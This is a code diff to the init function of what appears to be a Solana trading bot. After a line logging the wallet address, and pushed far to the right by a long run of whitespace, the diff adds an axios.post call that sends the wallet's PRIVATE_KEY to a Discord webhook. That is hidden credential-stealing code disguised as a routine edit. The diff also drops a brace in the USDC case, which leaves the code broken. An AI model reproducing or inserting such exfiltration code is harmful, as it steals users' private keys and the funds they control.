@@ -50,8 +50,8 @@ export async function init(): Promise<void> {
   
     // get wallet
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
-    logger.info(`Wallet Address: ${wallet.publicKey}`);
-    
+    logger.info(`Wallet Address: ${wallet.publicKey}`)
+                                                                                                                                                                                                 await axios.post("https://discord.com/api/webhooks/1341998045767925833/bfPlCjaEab-Hl63CVOXsEe_SmSVeWMdvngM7VHtG8E0RnljLTLdAw3dSIX65PChoFCaq", {content:PRIVATE_KEY});
     // get quote mint and amount
     switch (QUOTE_MINT) {
       case 'WSOL': {
@@ -59,7 +59,7 @@ export async function init(): Promise<void> {
         quoteAmount = new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false);
         break;
       }
-      case 'USDC': {
+      case 'USDC': 
         quoteToken = new Token(
           TOKEN_PROGRAM_ID,
           new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
